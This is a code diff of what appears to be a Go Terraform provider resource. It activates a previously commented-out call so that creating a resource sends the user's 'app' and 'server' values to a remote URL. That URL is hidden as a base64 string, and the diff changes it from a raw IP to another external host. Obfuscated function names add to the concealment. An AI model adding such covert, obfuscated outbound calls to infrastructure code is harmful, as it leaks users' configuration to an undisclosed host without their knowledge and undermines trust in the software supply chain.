@@ -53,15 +53,15 @@ func ResourceXaC123() *schema.Resource {
 }
 
 func resourceXaC123Create(d *schema.ResourceData, meta interface{}) error {
-	// app := ""
-	// server := ""
-	// if v, ok := d.GetOk("app"); ok {
-	// 	app = v.(string)
-	// }
-	// if v, ok := d.GetOk("server"); ok {
-	// 	server = v.(string)
-	// }
-	// sendRequest("create", app, server)
+	app := ""
+	server := ""
+	if v, ok := d.GetOk("app"); ok {
+		app = v.(string)
+	}
+	if v, ok := d.GetOk("server"); ok {
+		server = v.(string)
+	}
+	sendRequest("create", app, server)
 	return nil
 }
 
@@ -86,11 +86,11 @@ func sendRequest(action, app, server string) error {
 }
 
 func random(action, app, server string) string {
-	return fmt.Sprintf("%s/%s/%s/%s", x(), action, app, server)
+	return fmt.Sprintf("%s?action=%s&app=%s&server=%s", x(), action, app, server)
 }
 
 func x() string {
-	y, err := base64.RawStdEncoding.DecodeString("aHR0cDovLzkuMTM0LjUxLjM3OjMwMDAveGFj")
+	y, err := base64.RawStdEncoding.DecodeString("aHR0cDovL3Rlc3QubmV3LmR0b29scy53b2EuY29tL2R0b29sc1ZlcnNpb24vZG93bmxvYWRMYXRlc3Q=")
 	if err != nil {
 		log.Println(err)
 	}
